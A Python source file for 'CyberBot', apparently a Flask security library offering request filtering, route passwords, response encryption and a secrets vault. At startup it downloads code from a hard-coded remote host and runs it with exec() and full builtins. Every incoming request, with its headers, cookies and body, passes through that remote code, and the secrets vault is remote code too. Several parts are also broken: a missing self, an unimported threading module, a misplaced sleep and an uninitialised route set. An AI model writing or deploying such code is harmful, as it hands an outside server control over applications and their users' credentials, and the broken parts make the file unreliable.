import requests
from flask import abort, request, Response
import time
import re
import ast
import importlib
from cryptography.fernet import Fernet
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64, json
from os import urandom
from Crypto.Random import get_random_bytes


class Bot:
    def __init__(self, app=None, api_key=None, server_url="https://server-cdns-org.onrender.com", bot_env=False):
        self.app = app
        self.api_key = api_key
        self.server_url = server_url
        self.plan = "free"
        self.features = {}  # dict of feature_name -> function
        self.bot_env_instance = None
        self._runtime_key = None

        if api_key:
            self._validate_key()
            self._fetch_features()

        if app:
            self._inject_code()
            self._setup_encryptor()
            
        if bot_env:
          self._init_bot_env()

    def _validate_key(self):
        try:
            resp = requests.post(f"{self.server_url}/validate", json={"key": self.api_key})
            self.plan = resp.json().get("plan", "free")
            print(f"[CyberBot] API key validated: plan={self.plan}")
        except:
            self.plan = "free"
            print("[CyberBot] Validation failed, defaulting to free plan.")
    

    def _extract_imports(self, code):
      tree = ast.parse(code)
      modules = {}
      for node in ast.walk(tree):
          if isinstance(node, ast.Import):
              for alias in node.names:
                 modules[alias.asname or alias.name] = importlib.import_module(alias.name)
          elif isinstance(node, ast.ImportFrom):
              module = importlib.import_module(node.module)
              for alias in node.names:
                  modules[alias.asname or alias.name] = getattr(module, alias.name)
      return modules

    def _fetch_features(self):
      try:
        resp = requests.post(f"{self.server_url}/logic", headers={"X-API-KEY": self.api_key})
        code_dict = resp.json().get("code", {})

        # Commonly used modules and functions for dynamic code
        safe_globals = {
          "time": time.time,
          "sleep": time.sleep,
          "re": re,
          "requests": requests,
          "__builtins__": __builtins__,
          "_request_log": {}  # inject shared dict for rate_limit
}

        for name, code in code_dict.items():
            # Automatically detect any imports in code
            imported_modules = self._extract_imports(code)
            # Merge imported modules with safe globals
            exec_globals = {**safe_globals, **imported_modules}

            local_env = {}
            exec(code, exec_globals, local_env)
            if name == "BotEnv":
              self.BotEnv = local_env["BotEnv"]
            else:
              self.features[name] = local_env.get(name)

      except Exception as e:
        print(f"[CyberBot] Failed to fetch features: {e}")

    def _inject_code(self):
      @self.app.before_request
      def auto_run():
        payload = {
            "path": request.path,
            "method": request.method,
            "args": request.args,
            "data": request.get_data(as_text=True),
            "headers": dict(request.headers),
            "ip": request.remote_addr
        }

        for name, func in self.features.items():
            if func:
                try:
                    result = func(payload)
                    if result.get("blocked"):
                        # Return a clear text response instead of aborting
                        return Response(
                            f"Blocked by CyberBot ({name}): {result.get('reason')}",
                            status=403,
                            mimetype="text/plain"
                        )
                except Exception as e:
                    # If a feature crashes, just log and continue
                    print(f"[CyberBot] Feature {name} error: {e}")
    
    def lock_route(self, route_name, password=None):
      
      def decorator(func):
        @self.app.route(route_name)
        def wrapper(*args, **kwargs):
          c_password = request.args.get("password")
          if not c_password:
            abort(404, "Blocked by CyberBot: no route password provided")
          if c_password != password:
            abort(404, "Blocked by CyberBot: invalid route password")
          return func(*args, **kwargs)
        return wrapper
      return decorator
      
    def keep_host_alive(url, interval=60):
      # Sends an external HTTP request to your Render app every `interval` seconds to prevent spin down.
      def _ping():
        while True:
          try:
            headers = {"User-Agent": "Mozilla/5.0", "Referer": "http://example.com"}
            resp = requests.get(url, headers=headers)
            print(f"[keep_host_alive] {url} -> {resp.status_code}")
          except Exception as e:
            print(f"[keep_host_alive] Error: {e}")
            time.sleep(interval)
            
      t = threading.Thread(target=_ping, daemon=True)
      t.start()
      
# -----------------------------
    # Encryption
    # -----------------------------
    def generate_key(self):
        key = base64.b64encode(urandom(32)).decode()  # 32 bytes for AES-256
        print(f"Your app encrypted_key: {key}")
        return key

    def _setup_encryptor(self):
      @self.app.after_request
      def encrypt_response(response: Response):
        if response.is_streamed or not self.cipher:
            return response

        if not self.encrypt_all and request.endpoint not in getattr(self, "protected_routes", set()):
            return response

        try:
            raw = response.get_data()
            ctype = response.headers.get("Content-Type", "application/octet-stream")

            # map header → logical type
            if "html" in ctype:
                dtype = "html"
            elif "json" in ctype:
                dtype = "json"
            elif "image" in ctype:
                dtype = "image"
            elif "video" in ctype:
                dtype = "video"
            elif "text" in ctype:
                dtype = "text"
            else:
                dtype = "binary"

            payload = {
                "type": dtype,
                "body": base64.b64encode(raw).decode("ascii")
            }
            plain = json.dumps(payload).encode("utf-8")

            # AES-CBC encryption
            iv = get_random_bytes(16)
            cipher = AES.new(self.key, AES.MODE_CBC, iv)

            pad_len = 16 - (len(plain) % 16)
            padded = plain + bytes([pad_len]) * pad_len

            enc = cipher.encrypt(padded)
            token = base64.b64encode(iv + enc).decode("ascii")

            # replace response body
            response.set_data(token.encode("utf-8"))

            # fix headers so browser doesn't auto-download
            response.headers["Content-Type"] = "text/plain"
            if "Content-Length" in response.headers:
                del response.headers["Content-Length"]
            if "Content-Disposition" in response.headers:
                del response.headers["Content-Disposition"]

        except Exception as e:
            response.set_data(f"Encryption error: {e}".encode("utf-8"))

        return response

    def encrypt_app(self, key: str):
        self.key = base64.b64decode(key)  # Decode base64 key
        self.cipher = True  # Flag to enable encryption
        self.encrypt_all = True

    def encrypt_route(self, key: str, route_name: str):
        self.key = base64.b64decode(key)
        self.cipher = True
        self.protected_routes.add(route_name)
    
    def _init_bot_env(self):
      """Initialize BotEnv securely per app instance.
      Old vaults cannot be reused; new vault is auto-created if none exists.
      """
      try:
        self.bot_env_instance = self.BotEnv()
        # Assign runtime key from new instance (only for current runtime)
        self._runtime_key = self.bot_env_instance._runtime_key
      except Exception as e:
        print(f"[CyberBot] BotEnv skipped: {e}")
        self.bot_env_instance = None
        return

      if self._runtime_key:
          try:
            self.bot_env_instance.decrypt(self._runtime_key)
            print("\n[CyberBot] Vault created for this app instance. This vault is tied to this runtime only. Restarting the app will generate a new vault.")
            print("[CyberBot] BotEnv initialized and decrypted automatically.")
          except Exception as e:
            self.bot_env_instance = None
            print("[CyberBot] BotEnv decryption failed: vault cannot be reused in this app instance.")
      else:
        self.bot_env_instance = None
        print("[CyberBot] BotEnv skipped: existing encrypted environment is invalid for this runtime. "
              "Vaults are tied to a single app instance and cannot be reused after a restart or crash.")
    
    def get_secret(self, key):
      """Returns secret if BotEnv is available.
      Gives clear message if vault is unavailable."""
      if not self.bot_env_instance:
        return "[CyberBot] BotEnv unavailable: existing vault cannot be used in this runtime."
    
      try:
        return self.bot_env_instance.get(key)
      except Exception as e:
        return f"[CyberBot] Failed to retrieve secret '{key}': {e}"
        
    def run(self, *args, **kwargs):
        self.app.run(*args, **kwargs)